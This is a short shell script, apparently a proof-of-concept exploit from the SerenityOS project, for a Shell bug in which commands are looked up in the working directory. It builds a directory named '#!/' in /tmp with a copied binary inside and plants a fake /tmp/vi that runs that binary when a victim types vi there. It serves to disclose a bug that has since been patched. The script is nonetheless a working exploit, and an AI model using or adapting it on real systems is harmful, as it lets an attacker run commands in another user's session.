#!/bin/sh

#
# Copyright (c) 2021, the SerenityOS developers.
#
# SPDX-License-Identifier: BSD-2-Clause
#

# Shell is_runnable() execvp search current working directory LPE
# ---
# Shell searches the current working directory if a specified command cannot
# be found in $PATH. If an executable with the same name exists in the current
# working directory, and the executable is a shell script file, Shell will
# attempt to execute the file shebang line string with execvp().
#
# This can be leveraged to execute arbitrary commands by creating a directory
# called '#!/hax' in the working directory, and using this as the shebang
# interpreter for a Shell script in the working directory, leading to execution
# of arbitrary commands.
#
# This exploit creates an executable file `/tmp/vi` which executes
# `/tmp/#!/hax` when a user runs `vi` from within `/tmp/`.
#
# Note that `vi` must not exist in the user's $PATH.
# ---
# Details:
# - https://github.com/SerenityOS/serenity/issues/6774
# Patch:
# - https://github.com/SerenityOS/serenity/pull/6806
# ---
# ~ bcoles 2021

mkdir '/tmp/#!/'
cp /bin/reboot '/tmp/#!/hax'
echo '#!/hax' > /tmp/vi
chmod +x /tmp/vi
echo "Done! Now wait for a user to run vi in /tmp/ ..."

